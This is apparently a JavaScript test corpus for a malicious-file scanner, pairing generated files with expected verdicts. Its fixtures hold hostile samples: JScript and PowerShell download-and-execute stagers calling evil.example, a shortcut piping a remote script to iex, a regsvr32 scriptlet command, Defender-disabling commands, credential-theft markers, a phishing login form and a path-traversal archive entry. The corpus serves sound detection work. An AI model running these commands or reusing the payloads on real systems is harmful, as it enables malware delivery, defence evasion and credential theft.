import fs from "fs/promises";
import path from "path";
import zlib from "zlib";

function writeUInt32LE(value) {
  const buffer = Buffer.alloc(4);
  buffer.writeUInt32LE(value >>> 0, 0);
  return buffer;
}

function writeUInt16LE(value) {
  const buffer = Buffer.alloc(2);
  buffer.writeUInt16LE(value, 0);
  return buffer;
}

function buildZipArchive(entries) {
  const localParts = [];
  const centralParts = [];
  let localOffset = 0;

  for (const entry of entries) {
    const nameBuffer = Buffer.from(entry.name, "utf8");
    const sourceBuffer = Buffer.isBuffer(entry.content) ? entry.content : Buffer.from(entry.content);
    const compressionMethod = entry.method === "deflate" ? 8 : 0;
    const compressedData = compressionMethod === 8 ? zlib.deflateRawSync(sourceBuffer) : sourceBuffer;

    const localHeader = Buffer.concat([
      writeUInt32LE(0x04034b50),
      writeUInt16LE(20),
      writeUInt16LE(0),
      writeUInt16LE(compressionMethod),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt32LE(0),
      writeUInt32LE(compressedData.length),
      writeUInt32LE(sourceBuffer.length),
      writeUInt16LE(nameBuffer.length),
      writeUInt16LE(0),
      nameBuffer
    ]);

    localParts.push(localHeader, compressedData);

    const centralHeader = Buffer.concat([
      writeUInt32LE(0x02014b50),
      writeUInt16LE(20),
      writeUInt16LE(20),
      writeUInt16LE(0),
      writeUInt16LE(compressionMethod),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt32LE(0),
      writeUInt32LE(compressedData.length),
      writeUInt32LE(sourceBuffer.length),
      writeUInt16LE(nameBuffer.length),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt16LE(0),
      writeUInt32LE(0),
      writeUInt32LE(localOffset),
      nameBuffer
    ]);
    centralParts.push(centralHeader);

    localOffset += localHeader.length + compressedData.length;
  }

  const centralDirectory = Buffer.concat(centralParts);
  const localSection = Buffer.concat(localParts);
  const eocd = Buffer.concat([
    writeUInt32LE(0x06054b50),
    writeUInt16LE(0),
    writeUInt16LE(0),
    writeUInt16LE(entries.length),
    writeUInt16LE(entries.length),
    writeUInt32LE(centralDirectory.length),
    writeUInt32LE(localSection.length),
    writeUInt16LE(0)
  ]);

  return Buffer.concat([localSection, centralDirectory, eocd]);
}

function buildZipLikeBuffer(entryNames, extraText = "") {
  return Buffer.concat([
    Buffer.from([0x50, 0x4b, 0x03, 0x04]),
    Buffer.from(`\n${entryNames.join("\n")}\n${extraText}`, "utf8")
  ]);
}

function buildOleLikeBuffer(text = "") {
  return Buffer.concat([
    Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]),
    Buffer.from(`\n${text}`, "utf8")
  ]);
}

function buildLnkLikeBuffer(utf16Text = "") {
  return Buffer.concat([
    Buffer.from([
      0x4c, 0x00, 0x00, 0x00,
      0x01, 0x14, 0x02, 0x00,
      0x00, 0x00, 0x00, 0x00,
      0xc0, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x46
    ]),
    Buffer.from(utf16Text, "utf16le")
  ]);
}

function writeTarText(target, offset, length, value) {
  const buffer = Buffer.alloc(length, 0);
  Buffer.from(String(value), "utf8").copy(buffer, 0, 0, Math.min(length, Buffer.byteLength(String(value))));
  buffer.copy(target, offset);
}

function writeTarOctal(target, offset, length, value) {
  const octal = value.toString(8).padStart(length - 1, "0");
  const buffer = Buffer.alloc(length, 0);
  Buffer.from(octal).copy(buffer, 0, 0, Math.min(octal.length, length - 1));
  buffer[length - 1] = 0;
  buffer.copy(target, offset);
}

function buildTarArchive(entries) {
  const blocks = [];

  for (const entry of entries) {
    const content = Buffer.isBuffer(entry.content) ? entry.content : Buffer.from(entry.content);
    const header = Buffer.alloc(512, 0);
    writeTarText(header, 0, 100, entry.name);
    writeTarOctal(header, 100, 8, 0o644);
    writeTarOctal(header, 108, 8, 0);
    writeTarOctal(header, 116, 8, 0);
    writeTarOctal(header, 124, 12, content.length);
    writeTarOctal(header, 136, 12, 0);
    header.fill(0x20, 148, 156);
    header.write("0", 156, 1, "utf8");
    writeTarText(header, 257, 6, "ustar");
    writeTarText(header, 263, 2, "00");
    const checksum = [...header].reduce((sum, byte) => sum + byte, 0);
    writeTarOctal(header, 148, 8, checksum);
    blocks.push(header, content);

    const remainder = content.length % 512;
    if (remainder !== 0) {
      blocks.push(Buffer.alloc(512 - remainder, 0));
    }
  }

  blocks.push(Buffer.alloc(1024, 0));
  return Buffer.concat(blocks);
}

function buildLargePlainText(targetBytes = 256 * 1024) {
  const seedParagraph =
    "Operational review notes. This file is intentionally plain text with no scripts, binary payloads, or encoded blobs. ";
  let output = "";

  while (Buffer.byteLength(output, "utf8") < targetBytes) {
    output += seedParagraph;
  }

  return output.slice(0, targetBytes);
}

function buildBase64Blob(length = 560) {
  return "QUJD".repeat(Math.ceil(length / 4)).slice(0, length);
}

function corpusCase({
  id,
  category,
  title,
  fileName,
  declaredMimeType,
  expectedVerdicts,
  expectedFindingIds = [],
  expectedFindingOneOf = [],
  expectedReasonIncludes = [],
  content
}) {
  return Object.freeze({
    id,
    category,
    title,
    fileName,
    declaredMimeType,
    expectedVerdicts,
    expectedFindingIds,
    expectedFindingOneOf,
    expectedReasonIncludes,
    buildContent: typeof content === "function" ? content : () => content
  });
}

export const FILE_SCANNER_CORPUS = Object.freeze([
  corpusCase({
    id: "clean_plain_text",
    category: "clean",
    title: "Readable plain-text note",
    fileName: "notes.txt",
    declaredMimeType: "text/plain",
    expectedVerdicts: ["clean"],
    expectedReasonIncludes: ["No strong indicators were found"],
    content: "Quarterly notes\nEverything in this file is readable plain text.\n"
  }),
  corpusCase({
    id: "clean_large_plain_text",
    category: "clean",
    title: "Large benign text corpus",
    fileName: "operations-handbook.txt",
    declaredMimeType: "text/plain",
    expectedVerdicts: ["clean"],
    expectedReasonIncludes: ["No strong indicators were found"],
    content: () => buildLargePlainText()
  }),
  corpusCase({
    id: "unknown_macro_enabled_docm",
    category: "office",
    title: "Macro-enabled Office file without stronger evidence",
    fileName: "invoice.docm",
    declaredMimeType: "application/vnd.ms-word.document.macroEnabled.12",
    expectedVerdicts: ["unknown"],
    expectedFindingIds: ["macro_enabled_document"],
    content: "This content is not enough to prove malware, but the container is macro-enabled.\n"
  }),
  corpusCase({
    id: "suspicious_pdf_active_content",
    category: "pdf",
    title: "PDF with scripted and launch actions",
    fileName: "invoice.pdf",
    declaredMimeType: "application/pdf",
    expectedVerdicts: ["suspicious"],
    expectedFindingIds: ["pdf_active_content", "pdf_launch_or_rich_media"],
    content: Buffer.from('%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /Names << /JavaScript 3 0 R >> /Launch /EmbeddedFile >>\n')
  }),
  corpusCase({
    id: "suspicious_docx_macro_project",
    category: "office",
    title: "Macro project inside a macro-free Office container",
    fileName: "brief.docx",
    declaredMimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    expectedVerdicts: ["suspicious"],
    expectedFindingIds: ["ooxml_macro_project"],
    content: () => buildZipLikeBuffer(["[Content_Types].xml", "word/document.xml", "word/vbaProject.bin"])
  }),
  corpusCase({
    id: "unknown_xlsx_external_relationships",
    category: "office",
    title: "Spreadsheet package referencing external content",
    fileName: "finance.xlsx",
    declaredMimeType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    expectedVerdicts: ["unknown"],
    expectedFindingIds: ["ooxml_external_relationships"],
    content: () =>
      buildZipLikeBuffer([
        "[Content_Types].xml",
        "xl/workbook.xml",
        "xl/externalLinks/externalLink1.xml",
        "xl/_rels/workbook.xml.rels"
      ])
  }),
  corpusCase({
    id: "unknown_legacy_office_embedded_content",
    category: "office",
    title: "Legacy Office compound file with embedded-object markers",
    fileName: "ledger.xls",
    declaredMimeType: "application/vnd.ms-excel",
    expectedVerdicts: ["unknown"],
    expectedFindingIds: ["legacy_office_embedded_content"],
    content: () => buildOleLikeBuffer("Workbook Ole10Native ObjectPool VBA Macros")
  }),
  corpusCase({
    id: "suspicious_archive_risky_payloads",
    category: "archive",
    title: "Archive with risky payload names",
    fileName: "archive.zip",
    declaredMimeType: "application/zip",
    expectedVerdicts: ["suspicious"],
    expectedFindingIds: ["archive_risky_payloads", "archive_double_extension_payload", "archive_shortcut_dropper_chain"],
    content: () => buildZipLikeBuffer(["invoice.pdf.exe", "openme.lnk", "stage.js"])
  }),
  corpusCase({
    id: "malicious_javascript_dropper",
    category: "script",
    title: "JavaScript ActiveX downloader and launcher",
    fileName: "dropper.js",
    declaredMimeType: "application/javascript",
    expectedVerdicts: ["malicious"],
    expectedFindingIds: ["javascript_dropper_chain", "download_execute_chain"],
    content:
      'var sh=new ActiveXObject("WScript.Shell"); var x=new ActiveXObject("MSXML2.XMLHTTP"); var s=new ActiveXObject("ADODB.Stream"); x.open("GET","http://evil.example/payload",false); s.SaveToFile("payload.exe"); sh.Run("payload.exe");'
  }),
  corpusCase({
    id: "malicious_powershell_stager",
    category: "script",
    title: "PowerShell downloader and execution stager",
    fileName: "stage.ps1",
    declaredMimeType: "text/plain",
    expectedVerdicts: ["malicious"],
    expectedFindingIds: ["powershell_dropper_chain", "download_execute_chain"],
    content:
      'Start-BitsTransfer -Source "https://evil.example/a.ps1" -Destination "$env:TEMP\\a.ps1"; Invoke-Expression (New-Object Net.WebClient).DownloadString("https://evil.example/b.ps1"); powershell.exe -ExecutionPolicy Bypass'
  }),
  corpusCase({
    id: "suspicious_weaponized_lnk",
    category: "shortcut",
    title: "Shortcut that launches a script interpreter over a remote path",
    fileName: "claim.lnk",
    declaredMimeType: "application/octet-stream",
    expectedVerdicts: ["suspicious"],
    expectedFindingIds: ["lnk_script_interpreter", "lnk_remote_target"],
    content: () => buildLnkLikeBuffer('powershell.exe -w hidden -c iwr https://evil.example/stage.ps1 | iex \\\\server\\dropper')
  }),
  corpusCase({
    id: "suspicious_html_credential_lure",
    category: "html",
    title: "HTML lure with redirect, hidden frame, and credential post",
    fileName: "login.html",
    declaredMimeType: "text/html",
    expectedVerdicts: ["suspicious"],
    expectedFindingIds: ["html_meta_refresh_redirect", "html_hidden_frame", "html_external_credential_form"],
    content:
      '<html><head><meta http-equiv="refresh" content="0;url=https://evil.example"></head><body><iframe style="display:none" src="https://evil.example/frame"></iframe><form action="https://evil.example/post"><input type="email"><input type="password"></form></body></html>'
  }),
  corpusCase({
    id: "suspicious_archive_unsafe_paths",
    category: "archive",
    title: "Archive path traversal payload",
    fileName: "unsafe.zip",
    declaredMimeType: "application/zip",
    expectedVerdicts: ["suspicious"],
    expectedFindingIds: ["archive_unsafe_paths"],
    content: () =>
      buildZipArchive([
        {
          name: "../escape.js",
          content: Buffer.from('eval("alert(1)")')
        }
      ])
  }),
  corpusCase({
    id: "malicious_regsvr32_proxy_execution",
    category: "lolbin",
    title: "Regsvr32 scriptlet proxy execution",
    fileName: "regsvr32.txt",
    declaredMimeType: "text/plain",
    expectedVerdicts: ["malicious"],
    expectedFindingIds: ["regsvr32_scriptlet_proxy"],
    content: "regsvr32 /s /n /u /i:https://evil.example/payload.sct scrobj.dll"
  }),
  corpusCase({
    id: "suspicious_defender_tampering",
    category: "evasion",
    title: "Defender preference tampering",
    fileName: "defender.ps1",
    declaredMimeType: "text/plain",
    expectedVerdicts: ["suspicious"],
    expectedFindingIds: ["defender_tampering"],
    content: "Set-MpPreference -DisableRealtimeMonitoring $true\r\nAdd-MpPreference -ExclusionPath C:\\Users\\Public\r\n"
  }),
  corpusCase({
    id: "suspicious_browser_data_theft",
    category: "credential-access",
    title: "Browser credential-store theft markers",
    fileName: "stealer.txt",
    declaredMimeType: "text/plain",
    expectedVerdicts: ["suspicious"],
    expectedFindingIds: ["browser_data_theft"],
    content: "Login Data Cookies Web Data Local State encrypted_key CryptUnprotectData"
  }),
  corpusCase({
    id: "unknown_long_base64_blob",
    category: "obfuscation",
    title: "Large encoded blob without stronger execution markers",
    fileName: "blob.txt",
    declaredMimeType: "text/plain",
    expectedVerdicts: ["unknown"],
    expectedFindingIds: ["long_base64_blob"],
    content: () => buildBase64Blob()
  }),
  corpusCase({
    id: "suspicious_email_sender_and_link",
    category: "email",
    title: "Email with sender mismatch, auth failures, and blocked local URL",
    fileName: "suspicious.eml",
    declaredMimeType: "message/rfc822",
    expectedVerdicts: ["suspicious", "malicious"],
    expectedFindingIds: ["email_reply_to_mismatch", "email_spf_failed"],
    expectedFindingOneOf: [["email_embedded_links_suspicious", "email_embedded_links_malicious"]],
    content: `From: Security Team <alerts@trusted.example>
Reply-To: attacker@evil.example
To: employee@example.com
Subject: Verify your account
Date: Tue, 16 Mar 2026 11:00:00 +0000
Message-ID: <message-1@example.com>
Authentication-Results: mx.example; spf=fail smtp.mailfrom=trusted.example; dkim=fail header.d=trusted.example; dmarc=fail header.from=trusted.example
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"

Please verify right now: http://127.0.0.1/login
`
  }),
  corpusCase({
    id: "archive_nested_tgz_payload",
    category: "archive",
    title: "Gzip-wrapped tar archive containing a suspicious script",
    fileName: "payload.tgz",
    declaredMimeType: "application/gzip",
    expectedVerdicts: ["suspicious", "malicious"],
    expectedFindingOneOf: [["archive_nested_suspicious", "archive_nested_malicious"]],
    content: () => {
      const tarArchive = buildTarArchive([
        {
          name: "payload/run.js",
          content:
            'var sh=new ActiveXObject("WScript.Shell"); var x=new ActiveXObject("MSXML2.XMLHTTP"); var s=new ActiveXObject("ADODB.Stream"); sh.Run("cmd.exe");'
        }
      ]);
      return zlib.gzipSync(tarArchive);
    }
  })
]);

export async function materializeFileScannerCorpusCase(corpusEntry, directoryPath) {
  const filePath = path.join(directoryPath, corpusEntry.fileName);
  const content = await Promise.resolve(corpusEntry.buildContent());
  await fs.mkdir(path.dirname(filePath), { recursive: true });
  await fs.writeFile(filePath, content);
  return {
    ...corpusEntry,
    filePath
  };
}

export async function materializeFileScannerCorpus(directoryPath, corpus = FILE_SCANNER_CORPUS) {
  const materialized = [];

  for (const entry of corpus) {
    materialized.push(await materializeFileScannerCorpusCase(entry, directoryPath));
  }

  return materialized;
}
